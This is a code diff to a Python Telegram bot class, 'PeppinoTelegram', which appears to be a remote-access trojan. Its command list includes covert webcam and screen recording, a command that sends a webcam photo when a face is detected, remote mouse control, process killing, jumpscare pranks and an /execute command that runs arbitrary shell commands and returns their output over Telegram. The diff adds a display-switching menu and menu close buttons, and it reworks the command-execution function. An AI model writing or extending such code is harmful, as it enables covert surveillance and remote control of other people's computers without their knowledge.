@@ -136,6 +136,7 @@ webcamclip - Record webcam.
 screenclip - Record screen.
 recordjum - Records 20 second clip of jumpscare.
 waitforface - Send a webcam photo when face is detected till timeout.
+displaymode - Send a display set menu.
 
 🔊 Audio & Volume
 breath - Play breathing sound.
@@ -689,6 +690,8 @@ class PeppinoTelegram:
             self.process_explorer_menu = None
             self.explorer_message = None
             self.mixer_menu_keyboard = None
+            self.mouse_controller_menu = None
+            self.display_mode_keyboard  = None
             #converts text to functions
             self.function_table: dict[str:Callable] = {
                 "pss":self.pss,
@@ -723,6 +726,7 @@ class PeppinoTelegram:
                 "johnporknoaudio":self.johnporknoaudio,
                 "planktonnoaudio":self.planktonnoaudio,
                 "distortedscreen":self.distorted_screen,
+                "displaymode":self.display_mode,
                 "jumpscarenoaudio":self.jumpscarenoaudio,
                 "fullclip":self.record_webcam_and_screen,
                 "duckyhelp":lambda: self.bsend(self.duckyhelp),
@@ -837,14 +841,25 @@ class PeppinoTelegram:
         def distorted_screen(self) -> None:
             self.modded_screenshot(lambda x: distorted_screen(x, randint(20, 40), randint(50, 55)))
 
-        def execute(self, command) -> None:
-            s = sp.run(command.split, stdout=sp.PIPE, stderr=sp.PIPE, encoding="utf-8")
+        def display_mode(self) -> None:
+            buttons = {
+                "Only PC"      : "/execute DisplaySwitch.exe /internal",
+                "Only External": "/execute DisplaySwitch.exe /external",
+                "Clone"        : "/execute DisplaySwitch.exe /clone",
+                "Extend"       : "/execute DisplaySwitch.exe /extend",
+            }
+            self.display_mode_keyboard = self.new_menu(buttons, close_btn_lab="DISPLAYSET_close")
+
+        def execute(self, *command) -> None:
+            command = " ".join(command)
+            s = sp.run(command, stdout=sp.PIPE, stderr=sp.PIPE, encoding="utf-8")
             if s.returncode:
                 output = s.stderr
             else:
                 output = s.stdout
     
-            self.bsend(output)
+            if output:
+                self.bsend(f"Output: {output}")
 
         def extract_commands(self) -> list[dict]:
             commands = findall(r'^([a-zA-Z0-9_]+) - (.*)', self.help, M)
@@ -975,7 +990,7 @@ class PeppinoTelegram:
                 "LEFT CLICK":"/leftclick", "UP":"/mouseu","RIGHTCLICK":"/rightclick",
                 "LEFT":"/mousel","DOWN":"/moused","RIGHT":"/mouser"
             }
-            self.mouse_controller_menu = self.new_menu(menu, label="Mouse Control", rows=3)
+            self.mouse_controller_menu = self.new_menu(menu, label="Mouse Control", rows=3, close_btn_lab="MOUSE_closemenu")
 
         def moused(self) -> None:
             pos = pg.position()
@@ -1052,7 +1067,8 @@ class PeppinoTelegram:
                     self.bsend(f"Invalid args for function {command}\n{e}")
                 except Exception as e:
                     self.bsend(f"Unhandled error for function {command}\n{e}")
-            elif func is None and command.startswith("PK"):
+
+            elif command.startswith("PK"):
                 if command == "PK_next_page" and self.process_explorer_menu:
                     self.process_killer_page += 1
                     self.process_killer(page=self.process_killer_page)
@@ -1063,6 +1079,19 @@ class PeppinoTelegram:
                     self.process_explorer_menu.delete()
                 elif command in ("PK_next_page", "PK_previous_page") and not self.process_explorer_menu:
                     self.bsend("Use /processkiller first")
+
+            elif command.startswith("DISPLAYSET"):
+                if command == "DISPLAYSET_close":
+                    if self.display_mode_keyboard:
+                        self.display_mode_keyboard.delete()
+                        self.display_mode_keyboard = None
+
+            elif command.startswith("MOUSE"):
+                if command == "MOUSE_closemenu":
+                    if self.mouse_controller_menu:
+                        self.mouse_controller_menu.delete()
+                        self.mouse_controller_menu = None
+
             elif command.startswith("MXR"):
                 if command == "MXR_close":
                     if self.mixer_menu_keyboard:
